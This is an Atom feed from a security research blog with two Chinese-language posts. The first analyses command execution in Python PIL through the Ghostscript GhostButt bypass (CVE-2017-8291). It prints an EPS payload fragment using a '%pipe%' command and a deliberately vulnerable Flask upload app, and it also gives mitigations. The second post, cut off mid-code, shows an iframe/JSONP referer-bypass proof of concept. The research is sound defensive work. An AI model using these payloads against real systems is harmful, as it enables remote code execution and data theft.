<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nearg1e</title>
  <subtitle>Web Develop&amp;Security / 安全研究 / 漏洞挖掘 / 安全开发 / Pyer / Anime</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.neargle.com/"/>
  <updated>2017-09-28T06:10:24.000Z</updated>
  <id>http://blog.neargle.com/</id>
  
  <author>
    <name>Neargle</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Exploiting Python PIL Module Command Execution Vulnerability</title>
    <link href="http://blog.neargle.com/2017/09/28/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability/"/>
    <id>http://blog.neargle.com/2017/09/28/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability/</id>
    <published>2017-09-28T05:28:54.000Z</published>
    <updated>2017-09-28T06:10:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是我用来支持先知和代码审计小密圈活动的文章，首发于: <a href="https://xianzhi.aliyun.com/forum/read/2163.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/2163.html</a></p>
<p><strong>PIL</strong> (Python Image Library) 应该是 Python 图片处理库中运用最广泛的，它拥有强大的功能和简洁的API。很多Python Web应用在需要实现处理图片的功能时，都会选择使用PIL。</p>
<p>PIL在对 eps 图片格式进行处理的时候，如果环境内装有 GhostScript，则会调用 GhostScript 在dSAFER模式下处理图片，即使是最新版本的PIL模块，也会受到 <code>GhostButt CVE-2017-8291</code> dSAFER模式Bypass漏洞的影响，产生命令执行漏洞。</p>
<p>据说大牛们看源码和 dockerfile 就可以了：<a href="https://github.com/neargle/PIL-RCE-By-GhostButt" target="_blank" rel="external">https://github.com/neargle/PIL-RCE-By-GhostButt</a></p>
<h2 id="一个简单常见的Demo">一个简单常见的Demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_img_size</span><span class="params">(filepath=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="string">'''获取图片长宽'''</span></span><br><span class="line">    <span class="keyword">if</span> filepath:</span><br><span class="line">        img = Image.open(filepath)</span><br><span class="line">        img.load()</span><br><span class="line">        <span class="keyword">return</span> img.size</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>我们在 Demo 里调用了PIL的 <code>Image.open</code>, <code>Image.load</code> 方法加载图片，最后返回图片的长和宽。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">2</span>]: get_img_size(<span class="string">'/tmp/images.png'</span>)</span><br><span class="line">Out[<span class="number">2</span>]: (<span class="number">183</span>, <span class="number">275</span>)</span><br></pre></td></tr></table></figure>
<h2 id="分析">分析</h2><h3 id="Image-open_图片格式判断的问题">Image.open 图片格式判断的问题</h3><p>PIL在 <code>Image.open</code> 函数里面判断图片的格式，首先它调用 <code>_open_core</code> 函数， 在<code>_open_core</code>里面则是调用各个格式模块中的<code>_accept</code>函数，判断所处理的图片属于哪一个格式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_open_core</span><span class="params">(fp, filename, prefix)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ID:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            factory, accept = OPEN[i]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> accept <span class="keyword">or</span> accept(prefix):</span><br><span class="line">                fp.seek(<span class="number">0</span>)</span><br><span class="line">                im = factory(fp, filename)</span><br><span class="line">                _decompression_bomb_check(im.size)</span><br><span class="line">                <span class="keyword">return</span> im</span><br><span class="line">        <span class="keyword">except</span> (SyntaxError, IndexError, TypeError, struct.error):</span><br><span class="line">            <span class="comment"># Leave disabled by default, spams the logs with image</span></span><br><span class="line">            <span class="comment"># opening failures that are entirely expected.</span></span><br><span class="line">            <span class="comment"># logger.debug("", exc_info=True)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">im = _open_core(fp, filename, prefix)</span><br></pre></td></tr></table></figure>
<p>这里 <code>_accept(prefix)</code> 函数中的参数 prefix 就是图片文件头部的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PIL/GifImagePlugin.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_accept</span><span class="params">(prefix)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> prefix[:<span class="number">6</span>] <span class="keyword">in</span> [<span class="string">b"GIF87a"</span>, <span class="string">b"GIF89a"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># PIL/EpsImagePlugin.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_accept</span><span class="params">(prefix)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> prefix[:<span class="number">4</span>] == <span class="string">b"%!PS"</span> <span class="keyword">or</span> \</span><br><span class="line">           (len(prefix) &gt;= <span class="number">4</span> <span class="keyword">and</span> i32(prefix) == <span class="number">0xC6D3D0C5</span>)</span><br></pre></td></tr></table></figure>
<p>可以发现PIL使用文件头来判断文件类型，也就是说即使我们用它处理一个以<code>.jpg</code>结尾的文件，只要文件内容以<code>%!PS</code>开头，那么PIL就会返回一个<code>PIL.EpsImagePlugin.EpsImageFile</code>对象，使用eps格式的逻辑去处理它。之后调用的load方法也是<code>EpsImageFile</code>里面的load方法。</p>
<h3 id="Image-load_到_subprocess-check_call">Image.load 到 subprocess.check_call</h3><p>真实的环境中，程序员可能不会刻意去调用<code>load()</code>方法，但是其实Image文件中几乎所有的功能函数都会调用到<code>load()</code>。在 PIL/EpsImagePlugin.py 文件内我们关注的调用链为: <code>load()</code> -&gt; <code>Ghostscript()</code> -&gt; <code>subprocess.check_call()</code>, 最后使用<code>subprocess.check_call</code>执行了 gs 命令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">command = [<span class="string">"gs"</span>,</span><br><span class="line">            <span class="string">"-q"</span>,                         <span class="comment"># quiet mode</span></span><br><span class="line">            <span class="string">"-g%dx%d"</span> % size,             <span class="comment"># set output geometry (pixels)</span></span><br><span class="line">            <span class="string">"-r%fx%f"</span> % res,              <span class="comment"># set input DPI (dots per inch)</span></span><br><span class="line">            <span class="string">"-dBATCH"</span>,                    <span class="comment"># exit after processing</span></span><br><span class="line">            <span class="string">"-dNOPAUSE"</span>,                  <span class="comment"># don't pause between pages,</span></span><br><span class="line">            <span class="string">"-dSAFER"</span>,                    <span class="comment"># safe mode</span></span><br><span class="line">            <span class="string">"-sDEVICE=ppmraw"</span>,            <span class="comment"># ppm driver</span></span><br><span class="line">            <span class="string">"-sOutputFile=%s"</span> % outfile,  <span class="comment"># output file</span></span><br><span class="line">            <span class="string">"-c"</span>, <span class="string">"%d %d translate"</span> % (-bbox[<span class="number">0</span>], -bbox[<span class="number">1</span>]),</span><br><span class="line">                                            <span class="comment"># adjust for image origin</span></span><br><span class="line">            <span class="string">"-f"</span>, infile,                 <span class="comment"># input file</span></span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 省略判断是GhostScript是否安装的代码</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> open(os.devnull, <span class="string">'w+b'</span>) <span class="keyword">as</span> devnull:</span><br><span class="line">        subprocess.check_call(command, stdin=devnull, stdout=devnull)</span><br><span class="line">    im = Image.open(outfile)</span><br></pre></td></tr></table></figure>
<p>最后其执行的命令为<code>gs -q -g100x100 -r72.000000x72.000000 -dBATCH -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=/tmp/tmpi8gqd19k -c 0 0 translate -f ../poc.png</code>, 可以看到PIL使用了 dSAFER 参数。这个参数限制了文件删除,重命名和命令执行等行为,只允许 gs 打开标准输出和标准错误输出。而 <code>GhostButt CVE-2017-8291</code> 刚好就是 dSAFER 参数的bypass。</p>
<h3 id="GhostButt_CVE-2017-8291">GhostButt CVE-2017-8291</h3><p>该漏洞的详细的分析可以看 binjo 师傅的文章:<a href="http://wiki.ioin.in/url/APWQ" target="_blank" rel="external">GhostButt - CVE-2017-8291利用分析</a>，原先我复现和构造POC的时候花费了很多时间，后来看了这篇文章，给了我很多帮助。</p>
<p>这里我们用的poc和文章里面一样使用，也就是msf里面的poc:<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/poc.png" target="_blank" rel="external">poc.png</a>。虽然这里修改 eps 后缀为 png ，但其实文件内容确实典型的<code>eps</code>文件。截取部分内容如下:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%!PS-Adobe-3.0 EPSF-3.0&#10;%%BoundingBox: -0 -0 100 100&#10;&#10;... &#30465;&#30053;&#10;&#10;currentdevice null false mark /OutputFile (%pipe%touch /tmp/aaaaa)</span><br></pre></td></tr></table></figure>
<p>我们需要构造的命令执行payload就插入在这里 : <code>(%pipe%touch /tmp/aaaaa)</code>。</p>
<h2 id="真实环境（伪）和复现">真实环境（伪）和复现</h2><p>我使用之前写的的demo函数和Flask file-upload-sample写了一个简单的 Web app:<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/src/app.py" target="_blank" rel="external">app.py</a>，使这个本地命令执行变成一个远程命令执行。主要代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp'</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'png'</span>])</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_img_size</span><span class="params">(filepath=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="string">'''获取图片长宽'''</span></span><br><span class="line">    <span class="keyword">if</span> filepath:</span><br><span class="line">        img = Image.open(filepath)</span><br><span class="line">        img.load()</span><br><span class="line">        <span class="keyword">return</span> img.size</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="string">'''判断文件后缀是否合法'''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''文件上传app'''</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">'No file part'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        image_file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> image_file.filename == <span class="string">''</span>:</span><br><span class="line">            flash(<span class="string">'No selected file'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        <span class="keyword">if</span> image_file <span class="keyword">and</span> allowed_file(image_file.filename):</span><br><span class="line">            filename = secure_filename(image_file.filename)</span><br><span class="line">            img_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">            image_file.save(img_path)</span><br><span class="line">            height, width = get_img_size(img_path)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;html&gt;&lt;body&gt;the image\'s height : &#123;&#125;, width : &#123;&#125;; &lt;/body&gt;&lt;/html&gt;'</span>\</span><br><span class="line">                .format(height, width)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span><br><span class="line">    &lt;!doctype html&gt;</span><br><span class="line">    &lt;title&gt;Upload new File&lt;/title&gt;</span><br><span class="line">    &lt;h1&gt;Upload new File&lt;/h1&gt;</span><br><span class="line">    &lt;form method=post enctype=multipart/form-data&gt;</span><br><span class="line">      &lt;p&gt;&lt;input type=file name=file&gt;</span><br><span class="line">         &lt;input type=submit value=Upload&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    '''</span></span><br></pre></td></tr></table></figure>
<p>考虑到在 Windows 上面安装 PIL 和 GhostScript 可能会比较费劲，这里给大家提供一个 <a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Dockerfile" target="_blank" rel="external">dockerfile</a>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/neargle/PIL-RCE-By-GhostButt.git &amp;&amp; <span class="built_in">cd</span> PIL-RCE-By-GhostButt</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up <span class="operator">-d</span></span><br></pre></td></tr></table></figure>
<p>访问 <a href="http://localhost:8000/" target="_blank" rel="external">http://localhost:8000/</a> 可以看到文件上传页面。程序只使用允许后缀为 png 的文件上传，并在上传成功之后使用PIL获取图片长宽。我们修改poc，使用dnslog来验证漏洞。</p>
<p>页面截图:<br><img src="https://raw.githubusercontent.com/neargle/PIL-RCE-By-GhostButt/master/1.png" alt=""></p>
<p>DNSlog:<br><img src="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/2.png?raw=true" alt=""></p>
<h2 id="总结">总结</h2><h3 id="什么情况下我们的web服务会受到该漏洞影响">什么情况下我们的web服务会受到该漏洞影响</h3><ul>
<li>使用Python PIL库处理图片(应该是任意版本)</li>
<li>环境中有GhostScript(version &lt;= 9.21)</li>
</ul>
<h3 id="如何修复？">如何修复？</h3><p>一个是升级 GhostScript 版本。当然更新 PIL 的版本并不能解决问题，因为 pip 不会帮我们升级GhostScript。</p>
<p>另外在 Python 代码里面，如果我们的web程序不需要处理 eps 格式，除了对文件头进行判断排除 eps 文件之外，借用PIL自带的程序逻辑，也可以避免产生命令执行漏洞。PIL.Image会在 <code>init()</code> 里面加载 PIL 目录下的所有图片格式的处理方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> _initialized</span><br><span class="line">    <span class="keyword">if</span> _initialized &gt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> plugin <span class="keyword">in</span> _plugins:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logger.debug(<span class="string">"Importing %s"</span>, plugin)</span><br><span class="line">            __import__(<span class="string">"PIL.%s"</span> % plugin, globals(), locals(), [])</span><br><span class="line">        <span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">            logger.debug(<span class="string">"Image: failed to import %s: %s"</span>, plugin, e)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>但同时也为我们提供了preinit()方法，该方法只加载 Bmp, Gif, Jpeg, Ppm, Png，这五种常见图片格式的处理方法。只需在用<code>open</code>函数打开图片文件之前，使用 <code>preinit()</code>，并设置 <code>_initialized</code> 的值大于等于2，即可避免 Image 调用 GhostScript 去解析 eps 文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Image.preinit()</span><br><span class="line">Image._initialized = <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h2 id="最后">最后</h2><p>其实 Python 开发过程中有很多经典的代码执行或者命令执行问题，包括但不限于以下几种:</p>
<ul>
<li><code>pickle.loads(user_input)</code> : yaml, pickle等库在反序列化时产生的代码执行</li>
<li><code>Template(user_input)</code> : 模板注入(SSTI)所产生的代码执行</li>
<li><code>eval(user_input)</code> : eval等代码执行函数所导致的任意代码执行</li>
<li><code>subprocess.call(user_input, shell=True)</code> : popen, subprocess.call等函数所导致的命令执行</li>
</ul>
<p>PIL 这里出现的问题是比较少被提及的，实际的生产环境中到底常不常见就只能期待大家的反馈了。欢迎任何角度的纠错以及观点独到的建议。感谢祝好。</p>
<h2 id="Link">Link</h2><ul>
<li><a href="https://github.com/neargle/PIL-RCE-By-GhostButt" target="_blank" rel="external">https://github.com/neargle/PIL-RCE-By-GhostButt</a></li>
<li><a href="https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs921/ghostscript-9.21-linux-x86_64.tgz" target="_blank" rel="external">https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs921/ghostscript-9.21-linux-x86_64.tgz</a></li>
<li><a href="https://paper.seebug.org/310/" target="_blank" rel="external">https://paper.seebug.org/310/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是我用来支持先知和代码审计小密圈活动的文章，首发于: &lt;a href=&quot;https://xianzhi.aliyun.com/forum/read/2163.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://xianzhi.aliy
    
    </summary>
    
    
      <category term="Python" scheme="http://blog.neargle.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>使用request merging bypass referer(jsonp) 检测</title>
    <link href="http://blog.neargle.com/2017/09/01/use-request-merging-to-bypass-referer-check/"/>
    <id>http://blog.neargle.com/2017/09/01/use-request-merging-to-bypass-referer-check/</id>
    <published>2017-08-31T19:01:11.000Z</published>
    <updated>2017-09-02T01:25:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>更新两篇之前在其他地方发过的文章</em></p>
<h2 id="1-_关于request_merging和其会产生的问题">1. 关于request merging和其会产生的问题</h2><p>request merging : 浏览器会把多次相同的请求(并非所有请求)合并成一次，以加快资源加载速度。</p>
<p>e.g.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>只会请求并加载一次”<a href="http://0.0.0.0:8888/jsonp/1&quot;资源。" target="_blank" rel="external">http://0.0.0.0:8888/jsonp/1&quot;资源。</a></p>
<p><em>曾经有研究指出，这种请求合并想象在iframe里也存在</em>，那么浏览器的这种特性就可以用来bypass部分程序的referer的判断，如jsonp的防御机制。</p>
<h2 id="2-_环境和POC">2. 环境和POC</h2><p>绕过referer检测，攻击者能否拿到进行referer保护的用户信息？</p>
<p>攻击者服务器： <a href="http://example.com:8081" target="_blank" rel="external">http://example.com:8081</a><br>目标服务器： <a href="http://example.com:8082" target="_blank" rel="external">http://example.com:8082</a><br>referer检测： referer是否以“<a href="http://example.com:8082”开头" target="_blank" rel="external">http://example.com:8082”开头</a><br>目标： 攻击者拿到属于用户的 “security content”</p>
<h3 id="环境：">环境：</h3><p>/jsonp.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">(<span class="variable">$url</span>, <span class="variable">$domain</span>)</span> </span>&#123;</span><br><span class="line">     <span class="variable">$length</span> = strlen(<span class="variable">$domain</span>);</span><br><span class="line">     <span class="keyword">return</span> (substr(<span class="variable">$url</span>, <span class="number">0</span>, <span class="variable">$length</span>) === <span class="variable">$domain</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$referrer</span> = @<span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (startsWith(<span class="variable">$referrer</span>, <span class="string">"http://example.com:8082"</span>)) &#123;</span><br><span class="line">    <span class="variable">$js_code</span> = <span class="string">'function jquery() &#123; return "security content";&#125;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$js_code</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$js_code</span> = <span class="string">'function jquery() &#123; return "nothing";&#125;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$js_code</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>/index.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">title</span>&gt;</span>index in http://0.0.0.0<span class="tag">&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://example.com:8082/jsonp.php"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">    <span class="built_in">document</span>.write(location.href + <span class="string">":"</span> +jquery());</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="poc">poc</h3><p><a href="http://example.com:8081/poc.html" target="_blank" rel="external">http://example.com:8081/poc.html</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"http://example.com:8082/"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://example.com:8082/jsonp.php"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">    <span class="built_in">document</span>.write(jquery());</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>正常情况这个poc是没有办法获得jsonp里面的信息的，因为不能bypass<code>startsWith($referrer, &quot;http://example.com:8082&quot;)</code>的检测。<br>但是在request merging的情况下，浏览器因为script资源的url是相同的，所以它只会请求<code>http://example.com:8082/jsonp.php</code>一次，则我们可以在<code>example.com:8081</code>里拿到只有<code>example.com:8082</code>可以拿到的资源。</p>
<h2 id="第一次实验">第一次实验</h2><p>访问：<a href="http://example.com:8081/poc.html" target="_blank" rel="external">http://example.com:8081/poc.html</a></p>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fj4612z2h6j310q0fc3zw.jpg" alt=""></p>
<p>失败了…<br>之后我开始不正经了…</p>
<h2 id="fuzz_response_size_in_script_src">fuzz response size in script src</h2><p>难不成是response请求包大小的问题？请求太小的情况下，没有必要合并请求，所以浏览器直接不合并了？fuzz一下看看多大的请求会被合并。</p>
<p>代码：<br>flask:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response, Flask, stream_with_context</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/jsonp/&lt;int:size&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsonp</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_genrate_file</span><span class="params">(size)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="string">"1"</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="string">"\0"</span> * (size-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> Response(stream_with_context(_genrate_file(size)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 